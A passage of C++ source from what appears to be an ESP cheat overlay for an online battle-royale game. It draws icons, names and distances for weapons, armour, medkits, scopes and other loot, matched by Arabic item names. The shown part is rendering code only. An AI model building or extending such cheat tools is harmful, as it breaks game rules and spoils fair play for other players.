														string  statue1 = Item.Name + " [" + to_string(Distance) + "M]";
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, statue1, Screen.X - 60, Screen.Y + 30, ImColor(255, 255, 255, 255), true);
														continue;
													}
													if (Setting::Esp_Item_DP28 && Item.Name == u8"ﻲﺑ ﻱﺩ")
													{
														if (Setting::Esp_Item_DP28_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::DP28, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::DP28, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DP28_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_DP28_Color[0], Setting::Esp_Item_DP28_Color[1], Setting::Esp_Item_DP28_Color[2], Setting::Esp_Item_DP28_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_M762 && Item.Name == u8"ﻦﻔﺳ ﻡﺍ")
													{
														if (Setting::Esp_Item_M762_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::M762, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::M762, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M762_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M762_Color[0], Setting::Esp_Item_M762_Color[1], Setting::Esp_Item_M762_Color[2], Setting::Esp_Item_M762_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_SawedOff && Item.Name == u8"ﻑﻭﺍ ﺩﺍﻮﺳ")
													{
														if (Setting::Esp_Item_SawedOff_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::SawedOff, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::SawedOff, Screen.X - 50, Screen.Y - 25, 40, 40);
															}
														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_SawedOff_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_SawedOff_Color[0], Setting::Esp_Item_SawedOff_Color[1], Setting::Esp_Item_SawedOff_Color[2], Setting::Esp_Item_SawedOff_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_S12K && Item.Name == u8"ﻲﻛ 12 ﺱﺍ")
													{
														if (Setting::Esp_Item_S12K_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S12K, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S12K, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_S12K_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_S12K_Color[0], Setting::Esp_Item_S12K_Color[1], Setting::Esp_Item_S12K_Color[2], Setting::Esp_Item_S12K_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_S1897 && Item.Name == u8"1897ﺱﺍ")
													{
														if (Setting::Esp_Item_S1897_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S1897, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S1897, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}

														}
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_S1897_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_S1897_Color[0], Setting::Esp_Item_S1897_Color[1], Setting::Esp_Item_S1897_Color[2], Setting::Esp_Item_S1897_Color[3]), true);
														continue;

													}
													if (Setting::Esp_Item_S686 && Item.Name == u8"686ﺱﺍ")
													{
														if (Setting::Esp_Item_S686_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S686, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S686, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_S686_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_S686_Color[0], Setting::Esp_Item_S686_Color[1], Setting::Esp_Item_S686_Color[2], Setting::Esp_Item_S686_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_DBS && Item.Name == u8"ﺱﺍ ﻲﺑ ﻱﺩ")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_DBS_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_DBS_Color[0], Setting::Esp_Item_DBS_Color[1], Setting::Esp_Item_DBS_Color[2], Setting::Esp_Item_DBS_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_M1014 && Item.Name == u8"1014 ﻡﺍ")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M1014_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M1014_Color[0], Setting::Esp_Item_M1014_Color[1], Setting::Esp_Item_M1014_Color[2], Setting::Esp_Item_M1014_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_Neostead && Item.Name == u8"ﺪﻴﺘﺳﻮﻧ")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_M1014_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_M1014_Color[0], Setting::Esp_Item_M1014_Color[1], Setting::Esp_Item_M1014_Color[2], Setting::Esp_Item_M1014_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_Awm && Item.Name == u8"ﻡﻭﺍ")
													{
														if (Setting::Esp_Item_Awm_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::AWM, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::AWM, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Awm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Awm_Color[0], Setting::Esp_Item_Awm_Color[1], Setting::Esp_Item_Awm_Color[2], Setting::Esp_Item_Awm_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Groza && Item.Name == u8"ﺍﺯﻭﺮﺟ")
													{
														if (Setting::Esp_Item_Groza_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Groza, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Groza, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Groza_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Groza_Color[0], Setting::Esp_Item_Groza_Color[1], Setting::Esp_Item_Groza_Color[2], Setting::Esp_Item_Groza_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_FlareGun && Item.Name == u8"ﻦﺟ ﺮﻴﻠﻓ")
													{
														if (Setting::Esp_Item_Flare_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Flaregun, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Flaregun, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_FlareGun_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_FlareGun_Color[0], Setting::Esp_Item_FlareGun_Color[1], Setting::Esp_Item_FlareGun_Color[2], Setting::Esp_Item_FlareGun_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Flare && Item.Name == u8"ﻦﺟ ﺮﻴﻠﻓ ﻖﻠﻃ")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::fontsize, air, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Flare_Color[0], Setting::Esp_Item_Flare_Color[1], Setting::Esp_Item_Flare_Color[2], Setting::Esp_Item_Flare_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_Armor3 && Item.Name == u8"3 ﻞﻔﻟ ﻉﺭﺩ")
													{
														if (Setting::Esp_Item_Armor3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::VestV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::VestV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Armor3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Armor3_Color[0], Setting::Esp_Item_Armor3_Color[1], Setting::Esp_Item_Armor3_Color[2], Setting::Esp_Item_Armor3_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Bag3 && Item.Name == u8"3 ﻞﻔﻟ ﺔﻄﻨﺷ")
													{
														if (Setting::Esp_Item_Bag3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::BagV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::BagV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bag3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bag3_Color[0], Setting::Esp_Item_Bag3_Color[1], Setting::Esp_Item_Bag3_Color[2], Setting::Esp_Item_Bag3_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Helmet3 && Item.Name == u8"3 ﻞﻔﻟ ﺓﺫﻮﺧ")
													{
														if (Setting::Esp_Item_Helmet3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::HelmetV3, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Helmet3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Helmet3_Color[0], Setting::Esp_Item_Helmet3_Color[1], Setting::Esp_Item_Helmet3_Color[2], Setting::Esp_Item_Helmet3_Color[3]), true);
														continue;
														//}
													}  //
													if (Setting::Esp_Item_Awmimo && Item.Name == u8"ﻡﻭﺍ ﻖﻠﻃ")
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Awm_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Awmimo_Color[0], Setting::Esp_Item_Awmimo_Color[1], Setting::Esp_Item_Awmimo_Color[2], Setting::Esp_Item_Awmimo_Color[3]), true);
														continue;
													}
													if (Setting::Esp_Item_AR_Quick_Extended && Item.Name == u8"ﺭﺍ ﻱﺍ ﻊﻳﺮﺳ ﻊﺳﻮﻣ ﻥﺰﺨﻣ")
													{
														if (Setting::Esp_Item_AR_Quick_Extended_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::ARQExtended, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AR_Quick_Extended_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AR_Quick_Extended_Color[0], Setting::Esp_Item_AR_Quick_Extended_Color[1], Setting::Esp_Item_AR_Quick_Extended_Color[2], Setting::Esp_Item_AR_Quick_Extended_Color[3]), true);
														continue;
														//}
													}
												}
												if (Setting::healthitem)
												{
													if (Setting::Esp_Item_MedKit && Item.Name == u8"ﺖﻴﻛ ﺪﻴﻣ")
													{
														if (Setting::Esp_Item_MedKit_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::MedKit, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::MedKit, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_MedKit_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_MedKit_Color[0], Setting::Esp_Item_MedKit_Color[1], Setting::Esp_Item_MedKit_Color[2], Setting::Esp_Item_MedKit_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Bandage && Item.Name == u8"ﺝﺪﻧﺎﺑ")
													{
														if (Setting::Esp_Item_Bandage_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Bandage, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Bandage, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Bandage_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Bandage_Color[0], Setting::Esp_Item_Bandage_Color[1], Setting::Esp_Item_Bandage_Color[2], Setting::Esp_Item_Bandage_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_FirstAidKit && Item.Name == u8"ﻲﻟﻭﺃ ﻑﺎﻌﺳﺇ ﺔﺒﻴﻘﺣ")
													{
														if (Setting::Esp_Item_FirstAidKit_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::FirstAid, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::FirstAid, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_FirstAidKit_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_FirstAidKit_Color[0], Setting::Esp_Item_FirstAidKit_Color[1], Setting::Esp_Item_FirstAidKit_Color[2], Setting::Esp_Item_FirstAidKit_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_Painkiller && Item.Name == u8"ﺮﻠﻴﻛ ﻦﻴﺑ")
													{
														if (Setting::Esp_Item_FirstAidKit_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Pinkiller, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Pinkiller, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_Painkiller_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_Painkiller_Color[0], Setting::Esp_Item_Painkiller_Color[1], Setting::Esp_Item_Painkiller_Color[2], Setting::Esp_Item_Painkiller_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_EnergyDrink && Item.Name == u8"ﺔﻗﺎﻃ ﺏﻭﺮﺸﻣ")
													{
														if (Setting::Esp_Item_EnergyDrink_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::DrinkEnergy, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::DrinkEnergy, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_EnergyDrink_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_EnergyDrink_Color[0], Setting::Esp_Item_EnergyDrink_Color[1], Setting::Esp_Item_EnergyDrink_Color[2], Setting::Esp_Item_EnergyDrink_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_AdrenalineSyringe && Item.Name == u8"ﻦﻴﻟﺎﻨﻳﺭﺩﺍ ﺔﻨﻘﺣ")
													{
														if (Setting::Esp_Item_EnergyDrink_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::Injection, Screen.X - 50, Screen.Y - 25, 40, 40);
																continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::Injection, Screen.X - 50, Screen.Y - 25, 40, 40);
																continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_AdrenalineSyringe_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_AdrenalineSyringe_Color[0], Setting::Esp_Item_AdrenalineSyringe_Color[1], Setting::Esp_Item_AdrenalineSyringe_Color[2], Setting::Esp_Item_AdrenalineSyringe_Color[3]), true);
														continue;
														//}
													}
												}
												if (Setting::scope)
												{
													if (Setting::Esp_Item_x2 && Item.Name == u8"ﺏﻮﻜﺳ 2")
													{
														if (Setting::Esp_Item_x2_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S2X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S2X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x2_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x2_Color[0], Setting::Esp_Item_x2_Color[1], Setting::Esp_Item_x2_Color[2], Setting::Esp_Item_x2_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x3 && Item.Name == u8"ﺏﻮﻜﺳ 3")
													{
														if (Setting::Esp_Item_x3_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S3X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S3X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x3_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x3_Color[0], Setting::Esp_Item_x3_Color[1], Setting::Esp_Item_x3_Color[2], Setting::Esp_Item_x3_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x4 && Item.Name == u8"ﺏﻮﻜﺳ 4")
													{
														if (Setting::Esp_Item_x4_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S4X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S4X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x4_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x4_Color[0], Setting::Esp_Item_x4_Color[1], Setting::Esp_Item_x4_Color[2], Setting::Esp_Item_x4_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x6 && Item.Name == u8"ﺏﻮﻜﺳ 6")
													{
														if (Setting::Esp_Item_x6_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S6X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S6X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x6_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x6_Color[0], Setting::Esp_Item_x6_Color[1], Setting::Esp_Item_x6_Color[2], Setting::Esp_Item_x6_Color[3]), true);
														continue;
														//}
													}
													if (Setting::Esp_Item_x8 && Item.Name == u8"ﺏﻮﻜﺳ 8")
													{
														if (Setting::Esp_Item_x8_Icon)
														{
															if (Setting::Weapon_Icon_With_BG)
															{
																DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
																DX11::ImGui_DX11::DrawImage(DX11::S8X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
															else
															{
																DX11::ImGui_DX11::DrawImage(DX11::S8X, Screen.X - 50, Screen.Y - 25, 40, 40);
																//	continue;
															}
														}
														//else
														//{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_x8_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_x8_Color[0], Setting::Esp_Item_x8_Color[1], Setting::Esp_Item_x8_Color[2], Setting::Esp_Item_x8_Color[3]), true);
														continue;
														//}
													}
												}
												if (Setting::Esp_Item_GameCoin && Item.Name == u8"ﻕﻮﺴﺗ ﺕﻼﻤﻋ")
												{
													if (Setting::Esp_Item_GameCoin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::GameCoin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::GameCoin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, Setting::Esp_Item_GameCoin_TextSize, Text, Screen.X - 60, Screen.Y + 30, ImColor(Setting::Esp_Item_GameCoin_Color[0], Setting::Esp_Item_GameCoin_Color[1], Setting::Esp_Item_GameCoin_Color[2], Setting::Esp_Item_GameCoin_Color[3]), true);
													continue;

												}
												if (Setting::Esp_Item_Benzin && Item.Name == u8"ﻦﻳﺰﻨﺑ")
												{
													if (Setting::Esp_Item_Benzin_Icon)
													{
														if (Setting::Weapon_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X - 30, Screen.Y - 5, iconscircle, ImColor(bgcolor[0], bgcolor[1], bgcolor[2], bgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Benzin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Benzin, Screen.X - 50, Screen.Y - 25, 40, 40);
														}
													}
